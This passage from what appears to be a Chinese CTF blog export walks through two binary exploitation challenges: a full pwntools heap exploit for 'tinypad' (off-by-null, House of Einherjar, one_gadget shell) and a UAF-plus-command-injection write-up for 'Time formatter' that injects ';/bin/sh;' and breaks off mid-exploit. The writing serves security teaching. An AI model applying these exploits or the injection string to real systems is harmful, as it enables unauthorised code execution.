class=\"comment\">//8byte</span></span><br><span class=\"line\">    <span class=\"type\">char</span> content[size]; <span class=\"comment\">//malloc</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个程序具有add、free、edit、show功能，其中show是程序自带的，在输入命令之前会先输出所有的content。</p>\n<p>需要重点关注的是tinypad的数组，以tinypad[16*idx+0x100/0x108]的形式利用。idx==1也就是第一个tinypad的size是在tinypad[0x110]的位置，每一项总共也就0x10的空间，而前面0x110的空间是留给edit功能的。</p>\n<p>由于存在off by null，因此我们可以修改prev_size和prev_inuse并触发前向合并来造成overlapping。</p>\n<p>最多能同时有4个chunk，最大的size为0x100。</p>\n<p>edit功能比较复杂，在检验输入之后，会将该chunk用strcpy复制到tinypad偏移为0的位置进行操作，并且<strong>edit的长度和已经写入的字符串的长度相等</strong>，写入完成后才会将tinypad处的内容strcpy到chunk。由于strcpy会被\\x00截断，因此如果该chunk中有地址的话，edit的长度会比较小。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">write_n((__int64)<span class=\"string\">&quot;(INDEX)&gt;&gt;&gt; &quot;</span>, <span class=\"number\">11LL</span>);    <span class=\"comment\">// Edit</span></span><br><span class=\"line\">idx = read_int();</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( idx &lt;= <span class=\"number\">0</span> || idx &gt; <span class=\"number\">4</span> )</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_29;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( !*(_QWORD *)&amp;tinypad[<span class=\"number\">16</span> * idx + <span class=\"number\">0xF0</span>] )</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_31;</span><br><span class=\"line\">c = <span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(tinypad, *(<span class=\"type\">const</span> <span class=\"type\">char</span> **)&amp;tinypad[<span class=\"number\">16</span> * idx + <span class=\"number\">0xF8</span>]);<span class=\"comment\">// edit时会将其复制到tinypad中进行操作</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> ( <span class=\"built_in\">toupper</span>(c) != <span class=\"string\">&#x27;Y&#x27;</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    write_n((__int64)<span class=\"string\">&quot;CONTENT: &quot;</span>, <span class=\"number\">9LL</span>);</span><br><span class=\"line\">    v6 = <span class=\"built_in\">strlen</span>(tinypad);</span><br><span class=\"line\">    writeln((__int64)tinypad, v6);          <span class=\"comment\">// 会先输出原有的content</span></span><br><span class=\"line\">    write_n((__int64)<span class=\"string\">&quot;(CONTENT)&gt;&gt;&gt; &quot;</span>, <span class=\"number\">13LL</span>);</span><br><span class=\"line\">    len = <span class=\"built_in\">strlen</span>(*(<span class=\"type\">const</span> <span class=\"type\">char</span> **)&amp;tinypad[<span class=\"number\">16</span> * idx + <span class=\"number\">0xF8</span>]);<span class=\"comment\">// 直接取字符串的len值作为长度</span></span><br><span class=\"line\">    read_until((__int64)tinypad, len, <span class=\"string\">&#x27;\\n&#x27;</span>);<span class=\"comment\">// off by null</span></span><br><span class=\"line\">    writeln((__int64)<span class=\"string\">&quot;Is it OK?&quot;</span>, <span class=\"number\">9LL</span>);</span><br><span class=\"line\">    write_n((__int64)<span class=\"string\">&quot;(Y/n)&gt;&gt;&gt; &quot;</span>, <span class=\"number\">9LL</span>);</span><br><span class=\"line\">    read_until((__int64)&amp;c, <span class=\"number\">1uLL</span>, <span class=\"number\">0xA</span>u);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(*(<span class=\"type\">char</span> **)&amp;tinypad[<span class=\"number\">16</span> * idx + <span class=\"number\">0xF8</span>], tinypad);</span><br><span class=\"line\">writeln((__int64)<span class=\"string\">&quot;\\nEdited.&quot;</span>, <span class=\"number\">8LL</span>);</span><br></pre></td></tr></table></figure>\n\n<p>同时释放的函数处也有些小问题（UAF），释放之后没有清空chunk指针，有悬挂指针。虽然有标志位让其在edit的时无法通过检查，但在菜单处没有检查，会照常输出content的内容。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">free</span>(*(<span class=\"type\">void</span> **)&amp;tinypad[<span class=\"number\">16</span> * idx + <span class=\"number\">0xF8</span>]);<span class=\"comment\">// 释放但没请0，不过有标志位edit时也能检查到，不过会照常输出</span></span><br><span class=\"line\">*(_QWORD *)&amp;tinypad[<span class=\"number\">16</span> * idx + <span class=\"number\">0xF0</span>] = <span class=\"number\">0LL</span>;<span class=\"comment\">// 0代表没使用</span></span><br><span class=\"line\">writeln((__int64)<span class=\"string\">&quot;\\nDeleted.&quot;</span>, <span class=\"number\">9LL</span>);</span><br></pre></td></tr></table></figure>\n\n<p>在这里可以通过UAF泄露出当前的heapbase和libcbase。</p>\n<p>一开始尝试释放两个unsorted bin chunk后，<strong>一个的fd指向的是一个堆地址（下一个chunk的地址），另一个fd指向的是unsorted bin头</strong>，通过菜单显示出来。在实际中发现这样需要让两个释放的chunk不连续，并且中间要隔着一个size&lt;0x100的chunk，否则堆地址的低位会是\\x00，输出不出来。</p>\n<p>其实也可以通过释放两个fast bin chunk来泄露堆地址，释放一个unsorted bin chunk来泄露libc。</p>\n<p>在泄露了libcbase和heapbase之后，可以通过House of Einherjar实现overlapping。之后通过fast bin attack修改__malloc_hook为onegadget应该就可以get shell了。不过由于此处edit的特殊性，无法用于修改hook（hook处全为’\\x00’，因此len为0，不能写入东西），所以尝试overlapping到tinypad的位置，控制堆指针获得任意写。</p>\n<p>这里可以利用edit来在tinypad处构造fake chunk，由于<strong>edit会先在tinypad处写入数据</strong>，因此我们可以在此处写入。除此之外<strong>tinypad[0x110]开始就存放了chunk，tinypad[0x110]就是第一个chunk的size</strong>，我们可以不用构造next chunk size。</p>\n<p>为了控制堆指针，我们可以在0x602060处构造fake chunk，让其覆盖到堆指针(size位要为0x101)，并让第三个chunk的size为0x100。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># House of einherjar</span></span><br><span class=\"line\"></span><br><span class=\"line\">tinypad=<span class=\"number\">0x602040</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_chunk = tinypad+<span class=\"number\">0x20</span> <span class=\"comment\">#0x602060</span></span><br><span class=\"line\">offset=heapbase-fake_chunk+<span class=\"number\">0x50</span> <span class=\"comment\">#计算释放的idx2和fakechunk的偏移</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x48</span>)<span class=\"comment\">#idx1 用于off by null</span></span><br><span class=\"line\">add(<span class=\"number\">0xf0</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0xf0</span>)<span class=\"comment\">#idx2 用于触发house of einherjar</span></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">0x100</span>)<span class=\"comment\">#idx3 让0x602160的位置是0x100，使得fake chunk的size和next chunk的presize一致</span></span><br><span class=\"line\">add(<span class=\"number\">0xf0</span>,<span class=\"string\">&#x27;d&#x27;</span>*<span class=\"number\">0xf0</span>)<span class=\"comment\">#idx4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#construct fake chunk</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x101</span>)+p64(fake_chunk)+p64(fake_chunk)<span class=\"comment\">#fd和bk指向自己，绕过检查</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>+p64(offset)<span class=\"comment\">#off by null</span></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)<span class=\"comment\"># 触发house of einherjar</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x101</span>)+p64(malloc_hook+<span class=\"number\">0x10</span>+<span class=\"number\">88</span>)+p64(malloc_hook+<span class=\"number\">0x10</span>+<span class=\"number\">88</span>)</span><br><span class=\"line\"><span class=\"comment\">#不知道为什么如果不修改不能malloc，可能fd或者bk有错?</span></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在这之后，fake chunk就被释放合并到了unsorted bin中，下一次malloc会从中获取内存。</p>\n<p><img src=\"./tinypad/hoe.jpg\" alt=\"hoe\"></p>\n<p>然后就可以尝试get shell了，但这里有有些麻烦，由于开启了FULL RELRO，因此无法改写GOT表项，并且程序没有使用stdio，对FILE_IO的利用也不行，不过在libc中有一个全局变量**__environ<strong>，储存着该程序环境变量的地址，而环境变量是储存在</strong>栈**上的，所以可以泄露栈地址，所以可以控制rip。</p>\n<p>*<em>在__environ中的第一个位置上有一个栈地址，而这个栈地址距离main_ret（主程序返回操作）的距离是一个固定的偏移：8</em>30(*__environ-240)**，所以这里就可以找到main_ret的地址，之后我们修改它执行one_gadget即可getshell。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn2&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc-2.23.so&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./pwn2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">\tgdb.attach(p)</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(SIZE)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(CONTENT)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;d&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(INDEX)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;e&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(INDEX)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(CONTENT)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;(Y/n)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;y&quot;</span>)</span><br><span class=\"line\">\t<span class=\"comment\">#return data</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot; #   INDEX: &quot;</span>+<span class=\"built_in\">str</span>(idx)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot; # CONTENT: &quot;</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0xf0</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0xf0</span>)<span class=\"comment\">#idx1</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0x60</span>)<span class=\"comment\">#idx2</span></span><br><span class=\"line\">add(<span class=\"number\">0xf8</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">0xf8</span>)<span class=\"comment\">#idx3</span></span><br><span class=\"line\">add(<span class=\"number\">0xf0</span>,<span class=\"string\">&#x27;d&#x27;</span>*<span class=\"number\">0xf0</span>)<span class=\"comment\">#idx4</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc and heap base</span></span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">heapbase=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">1</span>:-<span class=\"number\">1</span>].ljust(<span class=\"number\">7</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x100</span></span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\">malloc_hook=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))-<span class=\"number\">88</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\">libcbase=malloc_hook-libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># House of einherjar</span></span><br><span class=\"line\"></span><br><span class=\"line\">tinypad=<span class=\"number\">0x602040</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_chunk = tinypad+<span class=\"number\">0x20</span></span><br><span class=\"line\">offset=heapbase-fake_chunk+<span class=\"number\">0x50</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x48</span>)<span class=\"comment\">#idx1</span></span><br><span class=\"line\">add(<span class=\"number\">0xf0</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0xf0</span>)<span class=\"comment\">#idx2</span></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">0x100</span>)<span class=\"comment\">#idx3</span></span><br><span class=\"line\">add(<span class=\"number\">0xf0</span>,<span class=\"string\">&#x27;d&#x27;</span>*<span class=\"number\">0xf0</span>)<span class=\"comment\">#idx4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#construct fake chunk</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x101</span>)+p64(fake_chunk)+p64(fake_chunk)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>+p64(offset)</span><br><span class=\"line\">add(<span class=\"number\">0x48</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x101</span>)+p64(malloc_hook+<span class=\"number\">88</span>+<span class=\"number\">0x10</span>)+p64(malloc_hook+<span class=\"number\">88</span>+<span class=\"number\">0x10</span>)</span><br><span class=\"line\">edit(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#get shell</span></span><br><span class=\"line\"></span><br><span class=\"line\">one_gadget=[<span class=\"number\">0x45226</span>,<span class=\"number\">0x4527a</span>,<span class=\"number\">0xf03a4</span>,<span class=\"number\">0xf1247</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#reset heap addr</span></span><br><span class=\"line\">environ_addr=libcbase+libc.symbols[<span class=\"string\">&#x27;__environ&#x27;</span>]</span><br><span class=\"line\">log,info(<span class=\"built_in\">hex</span>(environ_addr))</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x100</span>-<span class=\"number\">0x30</span>)+p64(<span class=\"number\">0x100</span>)+p64(environ_addr)+p64(<span class=\"number\">0x100</span>)+p64(<span class=\"number\">0x602148</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0xf8</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak __environ</span></span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">stack_addr=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;stack: &quot;</span>+<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(stack_addr-<span class=\"number\">240</span>))</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,p64(libcbase+one_gadget[<span class=\"number\">0</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;q&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   rax == NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   [rsp+0x30] == NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   [rsp+0x50] == NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   [rsp+0x70] == NULL</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"Time formatter","date":"2023-01-02T11:54:26.000Z","_content":"\n这应该算是一道堆题罢(doge)，虽然只是个非常简单的UAF\n\n<!--more-->\n\n首先查壳\n\n![protect](./time_formatter/protect.png)\n\n有个FORTIFY_SOURCE的对格式化字符串的保护\n\n1. 包含%n的格式化字符串不能位于程序内存中的可写地址。\n\n2. 当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。\n\n扔进ida看看源码，又是菜单,看代码改函数名弄到想吐\n\n简单解释一下这个程序的功能：\n- set_format():会用strdup申请一个chunk来存放输入的字符串，之后会对进行字符串中的字符进行检查（只能有字母、%、空格、：、#、-、_、0、/、^），不满足条件则会被free掉，**若满足，则会将chunk指针赋值给一个bss段中的变量ptr**\n- set_time():把你的输入写到一个固定的地方(没用)\n- set_zone():会用strdup申请一个chunk来存放输入的字符串，**但是不像set_format()那样进行检查**，chunk指针会赋值给value\n- print_time():如果ptr中有值，则会执行system(command)，command通过snprintf构造(**有漏洞**)\n- my_exit():先free了ptr和value，再问你是不是真的要退出，却并没有让ptr和value=>null，也没有清空其中的内容\n\n下面仔细看看值得注意的地方:\n\n**1.print_time()中command的构造**\n```c\n__snprintf_chk(command,2048LL,1LL,2048LL,\"/bin/date -d @%d +'%s'\",(unsigned int)dword_602120,(const char *)ptr);\n```\n这是什么东西?\n\n据说函数原型是这样的\n```c\nint snprintf(char *restrict buf, size_t n, const char * restrict  format[, arguement]);\n//str为要写入的字符串；n为要写入的字符的最大数目，超过n会被截断；format为格式化字符串,arguement为格式化字符串的参数\n```\n\n虽然不知道为什么2048LL后面有个1L,2048LL，但可以知道的是，ptr就是格式化字符串的第二个参数，其内容会写入%s处，因此如果可以在这里写入/bin/sh就可以执行system(\"/bin/sh\")了\n\n但是也没这么容易，还有一些坑：\n1. 前面已经有一条指令/bin/date ...了，要让shell执行ptr的指令（即一条语句执行两条指令），需要用到&&或;。由于&&需要前一条指令执行完才会执行第二条，而;则不需要，因此ptr中的内容要改为;/bin/sh\n2. 还有另一个坑，在格式化字符串中是'%s'，%s外面是单引号，而要执行system(\"/bin/sh\"),/bin/sh要在单引号外面，因此在前后加上单引号，并且为了不出错，后面也要加上一个;，最后变为';/bin/sh;'\n\n**2.set_format()和set_zone()**\n\nset_format()和set_zone()中都有一个函数strdup()\n```c\nextern char *strdup(char *s);\n//功 能: 将字符串拷贝到新建的位置处\n//strdup()在内部调用了malloc()为变量分配内存\n```\nset_format()可以将指针赋值给ptr;set_zone()可以将指针赋值给value\n\n除此之外，在set_format()中拷贝完字符串后，会对字符串内容进行检查\n```c\nstrcpy(accept, \"%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# \");// 字符只能在这个范围内\nv3 = __readfsqword(0x28u);\nreturn strspn(s, accept) == strlen(s);\n```\n这让我们不能直接通过set_format()将ptr指向';/bin/sh;'\n\n**但是在set_zone()中并没有安全检查**\n\n**3.my_exit()的迷之操作**\n\n在my_exit中会先free了ptr和value，再问你是否要退出,**但是在free之后,ptr和value没有指向null，也没有清空其中的内容，也就是存在UAF**\n\n利用过程：\n1. 通过set_format()存放一个字符串（chunk长度要和';/bin/sh;'一致）\n2. my_exit()实现free(ptr)\n3. 通过set_zone()将原来的chunk申请回来，并利用其不进行检查的特点，写入';/bin/sh;'\n4. 执行print_time()，getshell\n\n\nexp:\n```python\nfrom pwn 